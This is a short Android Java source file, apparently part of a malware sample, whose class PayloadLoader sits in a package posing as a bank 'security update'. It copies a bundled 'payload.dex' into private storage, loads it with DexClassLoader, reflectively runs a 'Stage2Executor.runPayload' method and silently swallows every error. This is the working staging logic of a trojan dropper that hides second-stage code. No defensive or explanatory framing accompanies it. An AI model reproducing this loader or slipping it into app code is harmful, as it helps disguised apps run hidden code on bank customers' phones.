package com.bank.security.update;

import android.content.Context;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;

public class PayloadLoader {

    public static void loadAndExecute(Context context) {
        try {
            File dexInternal = new File(context.getDir("payloads", Context.MODE_PRIVATE), "classes.dex");
            InputStream is = context.getAssets().open("payload.dex");
            FileOutputStream fos = new FileOutputStream(dexInternal);
            byte[] buf = new byte[1024];
            int len;
            while ((len = is.read(buf)) > 0) {
                fos.write(buf, 0, len);
            }
            fos.close();
            is.close();

            File optDir = context.getDir("outdex", Context.MODE_PRIVATE);
            DexClassLoader classLoader = new DexClassLoader(
                dexInternal.getAbsolutePath(),
                optDir.getAbsolutePath(),
                null,
                context.getClassLoader()
            );

            Class<?> loadedClass = classLoader.loadClass("com.payload.Stage2Executor");
            Method executeMethod = loadedClass.getMethod("runPayload", Context.class);
            executeMethod.invoke(null, context);

        } catch (Exception ignored) {
        }
    }
}
